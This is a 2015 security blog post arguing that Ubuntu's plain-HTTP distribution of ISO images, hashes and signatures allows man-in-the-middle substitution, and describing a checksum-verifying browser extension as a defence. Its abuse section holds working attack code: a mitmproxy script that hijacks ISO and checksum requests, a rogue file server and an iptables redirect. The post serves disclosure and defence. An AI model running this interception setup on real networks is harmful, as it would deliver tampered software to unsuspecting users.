---
layout: post
title: "On insecure software distribution practices"
description: Distributing files, their hashes, public keys, and signatures without encryption is a popular practice on today's web. Users are exposed to arbitrary code execution since trivial man-in-the-middle attacks are possible. This post analyzes the problem, shows its exploitation, and explains how to be safe.
img: /assets/posts/2015/10/01/http.jpg
imgcredit: "Hugo Humberto Plácido da Silva / freeimages.com"
date: 2015-10-01
permalink: /2015/10/01/on-insecure-software-distribution-practices
---


### Introduction

Distributing files, their hashes, public keys, and signatures without encryption is a popular practice on today's web. Users are exposed to arbitrary code execution since trivial man-in-the-middle attacks are possible. This post analyzes the problem, shows its exploitation, and explains how to be safe.

When a file is securely distributed, we can be sure that its originating entity was authenticated and that the integrity of the data was preserved during transfer. Modern platforms, such as operating systems and web browsers, are able to do this by using well-established cryptographic mechanisms based on public-key infrastructure. For example, web browsers ship with a list of trusted certificate authorities; and operating systems ship with a list of trusted public keys (belonging to their developers, generally).

Besides offering files, software providers may also distribute extra information that corroborates their integrity and authenticity, such as hashes and signatures. This can work in specific situations, where at least one of these elements is transferred with TLS.

<br>
<hr>
<br>
### What's the problem?

Let's consider Ubuntu's case. As for October 2015, the main page to download their ISO (<code class="inline">www.ubuntu.com/download/desktop</code>) does not support HTTPS. The download flow is generic, and after interacting with the website, the browser is taken to another page where more information about Ubuntu is shown (but there's nothing about verifying the ISO file) and the file is ready to be saved:

<center>
<video autoplay="" controls="" loop="" style="max-width:450px;height:auto;">
  <source src="/assets/posts/2015/10/01/demo-download-iso.webm" type="video/mp4" />
  Your browser does not support HTML5 video.
</video>
</center>

This distribution method is completely insecure and a trivial man-in-the-middle attack could go unnoticed:
* The page offering the file is served via HTTP
* The ISO image is served via HTTP
* The user is given no information on how to verify the downloaded ISO image (compare this to what Fedora does <a href="https://getfedora.org/en/workstation/download/ws-download-splash?file=https://download.fedoraproject.org/pub/fedora/linux/releases/22/Workstation/x86_64/iso/Fedora-Live-Workstation-x86_64-22-3.iso" target="_blank">when downloading their OS</a>)

Even if the user is aware that the ISO file should be verified, he/she would need to locate the hashes and signatures for it. The catch is that this information is also served through HTTP and cannot be accessed via HTTPS:

<center>
<video autoplay="" controls="" loop="" style="max-width:450px;height:auto;">
  <source src="/assets/posts/2015/10/01/demo-download-iso-hashes.webm" type="video/mp4" />
  Your browser does not support HTML5 video.
</video>
</center>

A trivial man-in-the-middle attack could render all this verification process useless: An attacker can serve bogus Ubuntu ISO images and their matching hashes and signature files. This attack exploits the fact that the public key of the Ubuntu Team (<code class="inline">0xFBB75451</code>) is not specified anywhere in these pages. To be fair, <a href="https://help.ubuntu.com/community/VerifyIsoHowto" target="_blank">this guide</a> (thankfully in HTTPS only) shows how to verify the ISO image, but then again, the user has to know where to look at to be 100% sure that the Ubuntu he/she will install is genuine.
<br>

The following graph (Google Trends) strongly suggests that not many users are interested in (or knowledgeable of) Ubuntu's ISO image verification:

<center>
<img width="90%" height="90%" src="/assets/posts/2015/10/01/trends.png" />
</center>

<br>
<hr>
<br>
### How can this be abused?
It's trivial for an attacker to act as a proxy and serve bogus files. After <a href="https://en.wikipedia.org/wiki/ARP_spoofing" target="_blank">poisoning the victim's ARP cache</a> and enabling packet forwarding, an attacker can run something like <code class="inline">mitmproxy</code> and manipulate the victim's HTTP requests:

{% highlight python %}
import os
from libmproxy import flow, proxy
from libmproxy.proxy.server import ProxyServer

# Files/directories being targeted, regardless of host.
TARGETS = [
    "/14.04.3/some_linux_distro.iso",
    "/14.04.3/SHA256SUMS.gpg",
    "/14.04.3/SHA256SUMS"
]

class Controller(flow.FlowMaster):
    def run(self):
        try:
            flow.FlowMaster.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, f):
        f = flow.FlowMaster.handle_request(self, f)
        if f:
            if f.request.path in TARGETS:
                print "Hijacking HTTP request for " + f.request.path
                f.request.port = 80
                f.request.host = "127.0.0.1"
            f.reply()
        return f

    def handle_response(self, f):
        f = flow.FlowMaster.handle_response(self, f)
        if f:
            f.reply()
        return f

config = proxy.ProxyConfig(
    port=8080,
    mode="transparent"
)
state = flow.State()
server = ProxyServer(config)
mitm_proxy = Controller(server, state)
mitm_proxy.run()
{% endhighlight %}

The previous script monitors for HTTP requests asking for for files named like the entries of the <code class="inline">TARGETS</code> list, regardless of the server. When it sees that someone requested any of these files, the proxy will redirect that request to our rogue HTTP server, where our bogus files will be fetched from: 

{% highlight python %}
import SocketServer
import SimpleHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

class MyHandler(SimpleHTTPRequestHandler):
    def translate_path(self, path):
        return "bogus_files/" + path.split("/")[-1]

httpd = SocketServer.TCPServer(("", 80), MyHandler)
httpd.serve_forever()
{% endhighlight %}

This server must be in the same level as the <code class="inline">bogus_files</code> directory like so: 

{% highlight bash %}
.
├── bogus_files
│   ├── some_linux_distro.iso
│   ├── SHA256SUMS.gpg
│   └── SHA256SUMS
└── rogue_http.py
{% endhighlight %}

Remember to connect your proxy and HTTP server together: 

{% highlight bash %}
iptables -t nat -A PREROUTING \
  -i eth0 -p tcp --dport 80   \
  -j REDIRECT --to-port 8080
{% endhighlight %}
<br>
<hr>
<br>

### How can this be prevented?

The most effective, yet optimistic, solution for this is to make software provider use TLS properly. However, in my opinion, that won't happen any time soon. But I do believe that this process will be accelerated if web browsers start dropping support for non-secure communications.
<br>

I think it's excellent news that Mozilla announced <a href="https://hacks.mozilla.org/2015/09/subresource-integrity-in-firefox-43/" target="_blank">subresource integrity in Firefox 43</a>. In short, they are implementing file-integrity checking for files that are loaded externally; and it’s very similar to what my PoC does, which I developed some months ago.
<br>

This extension is able to verify the integrity of files downloaded by right-clicking links (HTML anchors), given that the anchor tag has the <code class="inline">checksum</code> attribute defined, and that the HTML document containing the anchor tag was served via HTTPS. You can find its source (and an RFC-like description) here: <a href="https://github.com/epadillas/verified-download" target="_blank">https://github.com/epadillas/verified-download</a>.
<br>

This extension adds an item (“Verified Download”) to the menu you see when you right-click an anchor tag pointing to a file. This menu item will trigger the download and will instruct Firefox to report back if the checksum of the downloaded file is the same as the one specified in the <code class="inline">checksum</code> attribute belonging to that same anchor tag. Here's an example of a valid anchor tag:

{% highlight html %}
<a ref="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
checksum="sha256:262084257c2103702ef8a25705e3f8dbc1fa3823103ad7b954d54bdb77e6d89d">
Download image</a>
{% endhighlight %}

And here's a demo showing what happens when:
* The file checksum is the same as the one advertised in the anchor: no alert
* The file checksum differs from the one advertised in the anchor: red alert
* The anchor tag is right-clicked when the context is HTTP and not HTTPS: "Verified Download" option unavailable

<center>
<video width="80%" height="80%"  autoplay="" controls="" loop="">
  <source src="/assets/posts/2015/10/01/demo-plugin.webm" type="video/mp4" style="max-width:800px;height:auto;"/>
  Your browser does not support HTML5 video.
</video>
</center>
<br>
<hr>
<br>

### Conclusion

Files downloaded without TLS cannot be trusted. Hopefully web browsers will eventually stop supporting connections to servers that don't offer valid and trustworthy X.509 certificates by default. I'm quite glad Mozilla, Google et al. have been working on this interesting specification to tackle this issue:
* <a href="https://www.w3.org/TR/SRI/" target="_blank">W3C's Subresource Integrity</a>
* <a href="https://github.com/w3c/webappsec-subresource-integrity" target="_blank">https://github.com/w3c/webappsec-subresource-integrity</a>
